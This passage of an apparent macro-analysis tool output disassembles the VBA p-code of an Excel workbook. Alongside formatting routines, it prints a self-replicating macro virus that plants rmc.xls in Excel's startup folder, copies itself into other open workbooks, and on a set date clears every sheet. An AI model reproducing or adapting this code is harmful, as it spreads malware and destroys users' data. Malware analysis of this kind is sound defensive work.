' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	ArgsLd LCase 0x0001 
' 	St str 
' Line #45:
' 	Ld str 
' 	LitStr 0x0004 "date"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #46:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	LitDI2 0x009E 
' 	LitDI2 0x0002 
' 	Add 
' 	For 
' Line #47:
' 	Ld r 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	St julDate 
' Line #48:
' 	Ld julDate 
' 	LitDI4 0x1B7D 0x000B 
' 	Ge 
' 	Ld julDate 
' 	LitDI4 0x2B2B 0x000B 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #49:
' 	Ld julDate 
' 	LitDI4 0x955A 0x000A 
' 	Sub 
' 	Coerce (Date) 
' 	St d 
' Line #50:
' 	Ld d 
' 	Ld r 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemSt Cells 0x0002 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	NextVar 
' Line #53:
' 	Ld range 
' 	LitStr 0x0001 "A"
' 	ArgsLd Asc 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x001A 
' 	Mod 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "3"
' 	Concat 
' 	St c 
' Line #54:
' 	LitDI2 0x0002 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd range 0x0001 
' 	MemLd EntireColumn 
' 	MemSt NumberFormat 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' 	EndSub 
' Line #59:
' Line #60:
' 	FuncDefn (Private Sub Workbook_WindowDeactivate(ByVal Wn As ))
' Line #61:
' 	OnError (Resume Next) 
' Line #62:
' 	LitVarSpecial (False)
' 	St flag 
' Line #63:
' Line #64:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0008 "\rmc.xls"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St myfile 
' Line #65:
' 	Ld myfile 
' 	LitStr 0x0007 "rmc.xls"
' 	Ne 
' 	IfBlock 
' Line #66:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #67:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0008 "\rmc.xls"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed addtomru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #68:
' 	EndIfBlock 
' Line #69:
' Line #70:
' Line #71:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #72:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St eline 
' Line #73:
' 	Ld eline 
' 	Ld o 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld eline 
' 	LitStr 0x000C "thisworkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St vcode 
' 	EndIf 
' Line #74:
' Line #75:
' Line #76:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #77:
' 	Ld j 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St vcount 
' Line #78:
' 	Ld vcount 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld vcode 
' 	Paren 
' 	Ld j 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #79:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #80:
' Line #81:
' Line #82:
' 	Ld myfile 
' 	LitStr 0x0007 "rmc.xls"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	ParamNamed savechanges 
' 	LitStr 0x0007 "rmc.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' 	EndIf 
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	St dmonth 
' 	BoS 0x0000 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	St dday 
' 	BoS 0x0000 
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	St dhour 
' Line #87:
' Line #88:
' 	Ld dmonth 
' 	LitDI2 0x0004 
' 	Eq 
' 	Ld dday 
' 	LitDI2 0x0018 
' 	Eq 
' 	And 
' 	Ld dhour 
' 	LitDI2 0x000E 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St flag 
' 	EndIf 
' Line #89:
' Line #90:
' 	Ld flag 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #91:
' 	LineCont 0x0004 08 00 02 00
' 	LitStr 0x0046 "Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? "
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0012 "Answer : Barisada "
' 	Concat 
' 	Ld vbYesNo 
' 	LitStr 0x000C "1st Qusetion"
' 	ArgsLd MsgBox 0x0003 
' 	St v1 
' Line #92:
' Line #93:
' 	Ld v1 
' 	Ld vbNo 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001D "Good! You're Authorized now!!"
' 	Ld vbOKOnly 
' 	LitStr 0x000C "Right Answer"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #94:
' 	Ld v1 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #95:
' 	LitStr 0x002C "I wil give you one more Chance. Be careful!!"
' 	Ld vbOKOnly 
' 	Ld vbCritical 
' 	Add 
' 	LitStr 0x000C "Wrong Answer"
' 	ArgsCall MsgBox 0x0003 
' Line #96:
' 	LitStr 0x002E "Summoning Xavier is the Ultimate Magic. Right?"
' 	Ld vbYesNo 
' 	LitStr 0x002B "Wrong Answer may cause The Serious Problem!"
' 	ArgsLd MsgBox 0x0003 
' 	St v2 
' Line #97:
' 	Ld v2 
' 	Ld vbYes 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0017 "ok , i will forgive you"
' 	Ld vbOKOnly 
' 	LitStr 0x000C "Right Answer"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #98:
' 	Ld v2 
' 	Ld vbNo 
' 	Eq 
' 	IfBlock 
' Line #99:
' 	LitStr 0x0028 "Wrong Answer, Your file will be deleted!"
' 	Ld vbOKOnly 
' 	Ld vbCritical 
' 	Add 
' 	LitStr 0x000D "You shall Die"
' 	ArgsCall MsgBox 0x0003 
' Line #100:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #101:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Sheets 
' 	MemLd Count 
' 	For 
' Line #102:
' 	Ld i 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	MemLd Cells 
' 	ArgsMemCall Set 0x0000 
' Line #103:
' 	Ld Selection 
' 	ArgsMemCall Clear 0x0000 
' Line #104:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' Line #105:
' 	EndIfBlock 
' Line #106:
' Line #107:
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	EndIfBlock 
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' 	EndSub 
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' Line #193:
' Line #194:
' Line #195:
' Line #196:
' Line #197:
' Line #198:
' Line #199:
' Line #200:
' Line #201:
' Line #202:
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' Line #208:
' Line #209:
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' Line #214:
' Line #215:
' Line #216:
' Line #217:
' Line #218:
' Line #219:
' Line #220:
' Line #221:
' Line #222:
' Line #223:
' Line #224:
' Line #225:
' Line #226:
' Line #227:
' Line #228:
' Line #229:
' Line #230:
' Line #231:
' Line #232:
' Line #233:
' Line #234:
' Line #235:
' Line #236:
' Line #237:
' Line #238:
' Line #239:
' Line #240:
' Line #241:
' Line #242:
' Line #243:
' Line #244:
' Line #245:
' Line #246:
' Line #247:
' Line #248:
' Line #249:
' Line #250:
' Line #251:
' Line #252:
' Line #253:
' Line #254:
' Line #255:
' Line #256:
' Line #257:
' Line #258:
' Line #259:
' Line #260:
' Line #261:
' Line #262:
' Line #263:
' Line #264:
' Line #265:
' Line #266:
' Line #267:
' Line #268:
' Line #269:
' Line #270:
' Line #271:
' Line #272:
' Line #273:
' Line #274:
' Line #275:
' Line #276:
' Line #277:
' _VBA_PROJECT_CUR/VBA/List3 - 9831 bytes
' Line #0:
' 	FuncDefn (Public Sub Format$())
' Line #1:
' 	Dim 
' 	VarDefn i (As Integer)
' 	VarDefn r (As Long)
' 	VarDefn p (As Integer)
' 	VarDefn c (As Integer)
' 	VarDefn col (As String)
' 	VarDefn range (As String)
' Line #2:
' 	Dim 
' 	VarDefn tmp (As String)
' 	VarDefn mask (As String)
' 	VarDefn cellval (As String)
' Line #3:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	For 
' Line #4:
' 	Ld c 
' 	LitDI2 0x001A 
' 	Gt 
' 	Ld c 
' 	LitDI2 0x001A 
' 	Mod 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #5:
' 	LitStr 0x0001 "A"
' 	ArgsLd Asc 0x0001 
' 	Ld c 
' 	LitDI2 0x001A 
' 	Div 
' 	Paren 
' 	Add 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	St range 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	LitDI2 0x0001 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	ArgsLd LCase 0x0001 
' 	St tmp 
' Line #8:
' 	LitDI2 0x0002 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	St mask 
' Line #9:
' 	Ld mask 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld tmp 
' 	LitStr 0x0004 "date"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #10:
' 	Ld mask 
' 	LitStr 0x000A "hide_field"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	MemLd EntireColumn 
' 	ArgsMemCall Delete 0x0000 
' Line #12:
' 	Ld mask 
' 	LitStr 0x000B "number_mask"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	ElseIfBlock 
' Line #13:
' 	Ld range 
' 	LitStr 0x0001 "A"
' 	ArgsLd Asc 0x0001 
' 	Ld c 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x001A 
' 	Mod 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "3"
' 	Concat 
' 	St col 
' Line #14:
' 	LitStr 0x0018 "#,##0.00;[Red]-#,##0.00 "
' 	Ld col 
' 	Ld Sheet1 
' 	ArgsMemLd range 0x0001 
' 	MemLd EntireColumn 
' 	MemSt NumberFormat 
' Line #15:
' 	ElseBlock 
' Line #16:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	LitDI2 0x009E 
' 	LitDI2 0x0002 
' 	Add 
' 	For 
' Line #17:
' 	LitDI2 0x0001 
' 	St p 
' Line #18:
' 	LitStr 0x0000 ""
' 	St tmp 
' Line #19:
' 	Ld r 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St cellval 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mask 
' 	FnLen 
' 	For 
' Line #21:
' 	Ld p 
' 	Ld cellval 
' 	FnLen 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #22:
' 	LitStr 0x0003 "@#!"
' 	Ld mask 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #23:
' 	Ld tmp 
' 	Ld cellval 
' 	Ld p 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St tmp 
' Line #24:
' 	Ld p 
' 	LitDI2 0x0001 
' 	Add 
' 	St p 
' Line #25:
' 	ElseBlock 
' Line #26:
' 	Ld tmp 
' 	Ld mask 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St tmp 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	Ld tmp 
' 	Ld r 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemSt Cells 0x0002 
' Line #30:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	NextVar 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	LitStr 0x0002 "A2"
' 	Ld Sheet1 
' 	ArgsMemLd range 0x0001 
' 	MemLd EntireRow 
' 	ArgsMemCall Delete 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' Line #37:
' 	FuncDefn (Public Sub ConvertDate())
' Line #38:
' 	Dim 
' 	VarDefn i (As Integer)
' 	VarDefn r (As Long)
' 	VarDefn str (As String)
' 	VarDefn julDate (As Long)
' 	VarDefn c (As String)
' 	VarDefn range (As String)
' Line #39:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	For 
' Line #40:
' 	Ld i 
' 	LitDI2 0x001A 
' 	Gt 
' 	Ld i 
' 	LitDI2 0x001A 
' 	Mod 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #41:
' 	LitStr 0x0001 "A"
' 	ArgsLd Asc 0x0001 
' 	Ld i 
' 	LitDI2 0x001A 
' 	Div 
' 	Paren 
' 	Add 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	St range 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	ArgsLd LCase 0x0001 
' 	St str 
' Line #45:
' 	Ld str 
' 	LitStr 0x0004 "date"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #46:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	LitDI2 0x009E 
' 	LitDI2 0x0002 
' 	Add 
' 	For 
' Line #47:
' 	Ld r 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	St julDate 
' Line #48:
' 	Ld julDate 
' 	LitDI4 0x1B7D 0x000B 
' 	Ge 
' 	Ld julDate 
' 	LitDI4 0x2B2B 0x000B 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #49:
' 	Ld julDate 
' 	LitDI4 0x955A 0x000A 
' 	Sub 
' 	Coerce (Date) 
' 	St d 
' Line #50:
' 	Ld d 
' 	Ld r 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemSt Cells 0x0002 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	NextVar 
' Line #53:
' 	Ld range 
' 	LitStr 0x0001 "A"
' 	ArgsLd Asc 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x001A 
' 	Mod 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "3"
' 	Concat 
' 	St c 
' Line #54:
' 	LitDI2 0x0002 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd range 0x0001 
' 	MemLd EntireColumn 
' 	MemSt NumberFormat 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' 	EndSub 
' Line #59:
' Line #60:
' 	FuncDefn (Private Sub Workbook_WindowDeactivate(ByVal Wn As ))
' Line #61:
' 	OnError (Resume Next) 
' Line #62:
' 	LitVarSpecial (False)
' 	St flag 
' Line #63:
' Line #64:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0008 "\rmc.xls"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St myfile 
' Line #65:
' 	Ld myfile 
' 	LitStr 0x0007 "rmc.xls"
' 	Ne 
' 	IfBlock 
' Line #66:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #67:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0008 "\rmc.xls"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed addtomru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #68:
' 	EndIfBlock 
' Line #69:
' Line #70:
' Line #71:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #72:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St eline 
' Line #73:
' 	Ld eline 
' 	Ld o 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld eline 
' 	LitStr 0x000C "thisworkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St vcode 
' 	EndIf 
' Line #74:
' Line #75:
' Line #76:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #77:
' 	Ld j 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St vcount 
' Line #78:
' 	Ld vcount 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld vcode 
' 	Paren 
' 	Ld j 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #79:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #80:
' Line #81:
' Line #82:
' 	Ld myfile 
' 	LitStr 0x0007 "rmc.xls"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	ParamNamed savechanges 
' 	LitStr 0x0007 "rmc.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' 	EndIf 
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	St dmonth 
' 	BoS 0x0000 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	St dday 
' 	BoS 0x0000 
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	St dhour 
' Line #87:
' Line #88:
' 	Ld dmonth 
' 	LitDI2 0x0004 
' 	Eq 
' 	Ld dday 
' 	LitDI2 0x0018 
' 	Eq 
' 	And 
' 	Ld dhour 
' 	LitDI2 0x000E 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St flag 
' 	EndIf 
' Line #89:
' Line #90:
' 	Ld flag 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #91:
' 	LineCont 0x0004 08 00 02 00
' 	LitStr 0x0046 "Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? "
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0012 "Answer : Barisada "
' 	Concat 
' 	Ld vbYesNo 
' 	LitStr 0x000C "1st Qusetion"
' 	ArgsLd MsgBox 0x0003 
' 	St v1 
' Line #92:
' Line #93:
' 	Ld v1 
' 	Ld vbNo 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001D "Good! You're Authorized now!!"
' 	Ld vbOKOnly 
' 	LitStr 0x000C "Right Answer"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #94:
' 	Ld v1 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #95:
' 	LitStr 0x002C "I wil give you one more Chance. Be careful!!"
' 	Ld vbOKOnly 
' 	Ld vbCritical 
' 	Add 
' 	LitStr 0x000C "Wrong Answer"
' 	ArgsCall MsgBox 0x0003 
' Line #96:
' 	LitStr 0x002E "Summoning Xavier is the Ultimate Magic. Right?"
' 	Ld vbYesNo 
' 	LitStr 0x002B "Wrong Answer may cause The Serious Problem!"
' 	ArgsLd MsgBox 0x0003 
' 	St v2 
' Line #97:
' 	Ld v2 
' 	Ld vbYes 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0017 "ok , i will forgive you"
' 	Ld vbOKOnly 
' 	LitStr 0x000C "Right Answer"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #98:
' 	Ld v2 
' 	Ld vbNo 
' 	Eq 
' 	IfBlock 
' Line #99:
' 	LitStr 0x0028 "Wrong Answer, Your file will be deleted!"
' 	Ld vbOKOnly 
' 	Ld vbCritical 
' 	Add 
' 	LitStr 0x000D "You shall Die"
' 	ArgsCall MsgBox 0x0003 
' Line #100:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #101:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Sheets 
' 	MemLd Count 
' 	For 
' Line #102:
' 	Ld i 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	MemLd Cells 
' 	ArgsMemCall Set 0x0000 
' Line #103:
' 	Ld Selection 
' 	ArgsMemCall Clear 0x0000 
' Line #104:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' Line #105:
' 	EndIfBlock 
' Line #106:
' Line #107:
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	EndIfBlock 
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' 	EndSub 
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' Line #193:
' Line #194:
' Line #195:
' Line #196:
' Line #197:
' Line #198:
' Line #199:
' Line #200:
' Line #201:
' Line #202:
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' Line #208:
' Line #209:
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' Line #214:
' Line #215:
' Line #216:
' Line #217:
' Line #218:
' Line #219:
' Line #220:
' Line #221:
' Line #222:
' Line #223:
' Line #224:
' Line #225:
' Line #226:
' Line #227:
' Line #228:
' Line #229:
' Line #230:
' Line #231:
' Line #232:
' Line #233:
' Line #234:
' Line #235:
' Line #236:
' Line #237:
' Line #238:
' Line #239:
' Line #240:
' Line #241:
' Line #242:
' Line #243:
' Line #244:
' Line #245:
' Line #246:
' Line #247:
' Line #248:
' Line #249:
' Line #250:
' Line #251:
' Line #252:
' Line #253:
' Line #254:
' Line #255:
' Line #256:
' Line #257:
' Line #258:
' Line #259:
' Line #260:
' Line #261:
' Line #262:
' Line #263:
' Line #264:
' Line #265:
' Line #266:
' Line #267:
' Line #268:
' Line #269:
' Line #270:
' Line #271:
' Line #272:
' Line #273:
' Line #274:
' Line #275:
' Line #276:
' Line #277:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
